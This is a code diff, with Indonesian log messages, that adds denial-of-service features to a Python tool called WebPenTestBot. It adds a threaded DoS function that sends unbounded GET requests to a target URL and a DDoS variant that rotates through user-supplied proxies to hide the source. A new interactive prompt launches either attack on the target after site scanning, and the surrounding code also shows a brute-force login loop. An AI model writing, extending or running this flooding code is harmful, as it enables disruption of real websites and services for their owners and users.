@@ -130,6 +130,33 @@ class WebPenTestBot:
                     else:
                         self.log(f"{Colors.RED}[x] Gagal login dengan username: {username} dan password: {password}{Colors.RESET}")
 
+    def do_s_attack(self, url, threads=10):
+        def send_request():
+            while True:
+                try:
+                    response = requests.get(url)
+                    self.log(f"[DoS] Permintaan terkirim ke {url} | Status: {response.status_code}", Colors.YELLOW)
+                except requests.RequestException as e:
+                    self.log(f"[!] Gagal mengirim permintaan: {e}", Colors.RED)
+        
+        for _ in range(threads):
+            threading.Thread(target=send_request).start()
+
+    
+    def ddos_attack(self, url, proxy_list, num_threads=10):
+        def send_request():
+            session = requests.Session()
+            while True:
+                proxy = random.choice(proxy_list)
+                try:
+                    response = session.get(url, proxies={'http': proxy, 'https': proxy})
+                    self.log(f"[DDoS] Permintaan terkirim ke {url} menggunakan proxy {proxy} | Status: {response.status_code}", Colors.YELLOW)
+                except requests.RequestException as e:
+                    self.log(f"[!] Gagal mengirim permintaan: {e}", Colors.RED)
+        
+        for _ in range(num_threads):
+            threading.Thread(target=send_request).start()
+
     async def analyze_site(self):
         paths = ['/login', '/admin', '/upload', '/search', '/user', '/config', '/files', '/data']
         tasks = []
@@ -169,7 +196,19 @@ async def main():
             credentials = None
 
         bot = WebPenTestBot(target_url, proxy if proxy else None, login_url, credentials)
+        
         await bot.analyze_site()
+
+        attack_choice = input(f"{Colors.RED}Ingin melakukan DoS atau DDoS? Pilih (1) untuk DoS atau (2) untuk DDoS atau tekan Enter untuk melewati: {Colors.RESET}")
+        
+        if attack_choice == '1':
+            print(f"{Colors.YELLOW}Melakukan serangan DoS pada {target_url}...{Colors.RESET}")
+            bot.do_s_attack(target_url)
+        elif attack_choice == '2':
+            proxy_list = input(f"{Colors.CYAN}Masukkan daftar proxy (misal: http://proxy1:8080,http://proxy2:8080): {Colors.RESET}").split(',')
+            print(f"{Colors.YELLOW}Melakukan serangan DDoS pada {target_url} menggunakan proxy...{Colors.RESET}")
+            bot.ddos_attack(target_url, proxy_list)
 
 if __name__ == "__main__":
     asyncio.run(main())
+
